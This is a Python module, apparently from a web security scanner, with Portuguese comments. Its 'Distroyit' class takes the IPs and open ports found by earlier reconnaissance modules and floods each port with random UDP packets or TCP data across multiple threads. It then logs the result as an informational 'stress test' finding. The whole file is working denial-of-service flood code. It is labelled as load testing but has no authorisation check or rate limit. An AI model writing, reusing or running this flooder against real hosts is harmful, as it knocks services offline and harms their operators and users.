import random
import socket
import threading
from .base import BaseModule


class Distroyit(BaseModule):
    """Modulo ativado pos-analise utilizando IPs e portas descobertas."""

    def run(self) -> dict:
        # 1. Recupera os IPs obtidos pelo modulo 'recon' (com fallback de resolucao DNS)
        ips = self.context.get('ips', [])
        if not ips:
            domain = self.get_domain()
            try:
                ips = [socket.gethostbyname(domain)]
            except Exception:
                ips = []

        # 2. Recupera as portas abertas obtidas pelo modulo 'ports' (com fallback para porta da URL)
        ports = self.context.get('ports_list', [])
        if not ports:
            parsed = self.get_parsed_url()
            default_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            ports = [default_port]

        if not ips:
            self.add_finding(
                title="Distroyit: Host inacessivel",
                severity="INFO",
                detail="Nao foi possivel resolver o IP para execucao do teste de stress.",
                evidence=f"Dominio: {self.get_domain()}"
            )
            return self.result()

        target_ip = ips[0]
        threads_count = self.config.get('threads', 5)
        times = self.config.get('times', 1000)
        mode = self.config.get('choice', 'y')  # 'y' = UDP, 'n' = TCP

        if self.verbose:
            print(f"[*] Distroyit: Executando contra {target_ip} nas portas: {ports} ({mode.upper()})")

        # 3. Executa o teste de stress para cada porta descoberta
        for port in ports:
            self._stress_target(target_ip, port, mode=mode, threads=threads_count, times=times)

        self.add_finding(
            title="Stress Test Realizado (Distroyit)",
            severity="INFO",
            detail=f"Distroyit executado contra {target_ip} nas portas {ports}.",
            evidence=f"Alvo: {target_ip} | Portas: {ports} | Protocolo: {'UDP' if mode == 'y' else 'TCP'} | Threads: {threads_count} | Pacotes por conexao: {times}",
            recommendation="Certifique-se de que protecoes de firewall de borda, rate-limiting e mitigacao DDoS estao ativas."
        )

        return self.result({'target_ip': target_ip, 'ports': ports})

    def _stress_target(self, ip, port, mode='y', threads=5, times=1000):
        def worker_udp():
            data = random._urandom(1024)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip), int(port))
                for _ in range(times):
                    s.sendto(data, addr)
                s.close()
            except Exception:
                pass

        def worker_tcp():
            data = random._urandom(16)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(min(self.timeout, 3))
                s.connect((str(ip), int(port)))
                for _ in range(times):
                    s.send(data)
                s.close()
            except Exception:
                pass

        worker_fn = worker_udp if mode == 'y' else worker_tcp
        thread_list = []
        for _ in range(threads):
            th = threading.Thread(target=worker_fn)
            th.daemon = True
            th.start()
            thread_list.append(th)

        for th in thread_list:
            th.join(timeout=self.timeout)